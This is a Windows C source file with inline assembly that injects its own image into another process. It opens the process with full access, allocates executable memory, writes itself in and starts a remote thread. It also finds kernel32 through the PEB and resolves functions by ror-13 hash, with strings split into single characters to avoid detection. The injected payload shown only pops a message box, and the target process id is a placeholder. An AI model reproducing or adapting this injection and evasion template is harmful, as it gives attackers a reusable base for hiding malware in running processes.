#include<windows.h>
#include<stdio.h>
#define a_start __asm(".intel_syntax noprefix");__asm(
#define a_end );__asm(".att_syntax");
FARPROC CWA(DWORD64 ,DWORD64 );
DWORD64 getkernel32();
DWORD64 getntdll();
DWORD64 gethash(char *);
inject();
WinMainCRTStartup()
{
	DWORD64 size  = 0;			//put size of image
	DWORD pid = 0;				//put process id
	
	DWORD64 pd;
	HANDLE hProcess = (HANDLE)OpenProcess(PROCESS_ALL_ACCESS,0,pid);
	if(hProcess)
	{
		DWORD64 space = (DWORD64)VirtualAllocEx(hProcess,0,size,0x3000,0x40);
		if(space)
		{
			if(WriteProcessMemory(hProcess,space,GetModuleHandle(0),size,&pd))
			{
				WaitForSingleObject(CreateRemoteThread(hProcess,0,0,(LPTHREAD_START_ROUTINE)space+(0x1000 + inject - WinMainCRTStartup),0,0,0),INFINITE);
			}
			VirtualFreeEx(hProcess,space,size,0x8000);
		}
	}
	
}
inject()
{
	char mess[]={'M','e','s','s','a','g','e','B','o','x','A',0x00};
	char ll[]={'L','o','a','d','L','i','b','r','a','r','y','A',0x00};
	char user32[]={'u','s','e','r','3','2','.','d','l','l',0x00};
	CWA(gethash(mess),CWA(gethash(ll),getkernel32())(user32))(0,0,0,0);
}

DWORD64 gethash(char *name)
{
	a_start
	"xor rax,rax\n"
	"dec rcx\n"
	"prev:\n"
	"inc rcx\n"
	"ror rax,0xd\n"
	"add al,[rcx]\n"
	"cmp byte ptr[rcx+1],0\n"
	"jne prev\n"
	a_end
}
FARPROC CWA(DWORD64 hash,DWORD64 dll)
{
	a_start
	"xor rax,rax\n"
	"mov eax,[rdx+0x3c]\n"
	"mov rbx,rdx\n"
	"add rdx,rax\n"
	"add rdx,0x88\n"
	"mov eax,[rdx]\n"
	"add rax,rbx\n"
	"mov r8,rcx\n"
	"xor rcx,rcx\n"
	"xor rdx,rdx\n"
	"xor r9,r9\n"
	"mov edx,[rax+0x20]\n"
	"mov r9d,[rax+0x24]\n"
	"add rdx,rbx\n"
	"add r9,rbx\n"
	"loop_through_AON:\n"
	"xor rsi,rsi\n"
	"xor r10,r10\n"
	"xor r11,r11\n"
	"mov esi,[rdx+rcx*4]\n"
	"add rsi,rbx\n"
	"earlier:\n"
	"mov r11b,[rsi]\n"
	"test r11b,r11b\n"
	"jz later\n"
	"inc rsi\n"
	"ror r10,0xd\n"
	"add r10,r11\n"
	"jmp earlier\n"
	"later:\n"
	"cmp r10,r8\n"
	"jne again\n"
	"mov cx,[r9+rcx*2]\n"
	"xor rdx,rdx\n"
	"mov edx,[rax+0x1c]\n"
	"add rdx,rbx\n"
	"mov r11d,[rdx+rcx*4]\n"
	"mov rax,r11\n"
	"add rax,rbx\n"
	"jmp end\n"
	"again:\n"
	"inc ecx\n"
	"cmp ecx,[rax+0x18]\n"
	"jne loop_through_AON\n"
	"xor rax,rax\n"
	"end:\n"
	a_end
}

DWORD64 getntdll()
{
	a_start
	"xor rax,rax\n"
	"mov al,0x60\n"
	"mov rax,gs:[rax]\n"
	"mov rax,[rax+0x18]\n"
	"mov rax,[rax+0x10]\n"
	"mov rax,[rax]\n"
	"mov rax,[rax+0x30]\n"
	a_end
}

DWORD64 getkernel32()
{
	a_start
	"xor rax,rax\n"
	"mov al,0x60\n"
	"mov rax,gs:[rax]\n"
	"mov rax,[rax+0x18]\n"
	"mov rax,[rax+0x10]\n"
	"mov rax,[rax]\n"
	"mov rax,[rax]\n"
	"mov rax,[rax+0x30]\n"
	a_end
}
